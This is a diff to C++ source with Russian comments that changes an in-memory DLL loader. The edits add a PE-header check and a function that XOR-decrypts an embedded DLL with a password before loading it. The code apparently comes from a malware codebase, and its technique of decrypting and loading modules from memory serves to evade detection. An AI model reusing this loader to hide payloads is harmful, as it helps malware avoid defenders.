@@ -3,10 +3,10 @@
 #include "Memory.h"
 #include "Strings.h"
 #include "DllLoader.h"
-#include "Utils.h"
 #include "Crypt.h"
 #include "Config.h"
 #include "md5.h"
+
 
 typedef struct
 {
@@ -17,11 +17,37 @@ typedef struct
 	int initialized;
 } MEMORYMODULE, *PMEMORYMODULE;
 
-#define IMAGE_SIZEOF_BASE_RELOCATION         8
+#define IMAGE_SIZEOF_BASE_RELOCATION 8
 
 typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved );
 
 #define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]
+
+
+
+//--------------------------------------------------------
+//  Функция возвращает истину если буфер являетсяя DLL
+//--------------------------------------------------------
+bool BufferIsExecutableFile(LPVOID Buf)
+{
+	// Функция возвращает истину если буффер является заголовком
+	// exe файла
+	bool Result = false;
+	if (Buf)
+	{
+		PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)Buf;
+
+		if (Dos->e_magic == IMAGE_DOS_SIGNATURE)
+		{
+			PIMAGE_NT_HEADERS NT  = (PIMAGE_NT_HEADERS)&((const unsigned char *)(Buf))[Dos->e_lfanew];;
+			Result = (NT->Signature == IMAGE_NT_SIGNATURE);
+		}
+    }
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+
 
 void CopySections(LPBYTE data, LPBYTE codeBase, PIMAGE_NT_HEADERS old_headers, PIMAGE_NT_HEADERS new_headers)
 {
@@ -622,7 +648,7 @@ bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
 //  NewBufAllocated - Установится в истину, если
 //                    для буфера пришлось выделить память
 //---------------------------------------------------------
-bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
+bool TMemoryDLL::DecodeDllByPass(const char* Password, const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
 {
 	DllSize = 0;
 	NewBuf  = NULL;
@@ -631,7 +657,7 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 	if (!DllBuf) return false;
 
 	// Файл в исходном формате
-	if (IsExecutableFile((LPVOID)DllBuf))
+	if (BufferIsExecutableFile((LPVOID)DllBuf))
 	{
 		// Определяем размер длл файла
 		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)DllBuf;
@@ -668,13 +694,13 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 		{
 			// Копируем данные
 			m_memcpy(NewBuf, Buf, DllSize);
-			XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)NewBuf, DllSize);
+			XORCrypt::Crypt((PCHAR)Password, (LPBYTE)NewBuf, DllSize);
         }
 	}
 	else
 		NewBuf = Buf;
 
-	bool Result = IsExecutableFile(NewBuf);
+	bool Result = BufferIsExecutableFile(NewBuf);
 
 	if (!Result)
 	{
@@ -685,4 +711,9 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 	}
 
 	return Result;
+}
+
+bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
+{
+	return DecodeDllByPass(GetSessionPassword(), DllBuf, DllSize, NewBuf, NewBufAllocated);
 }
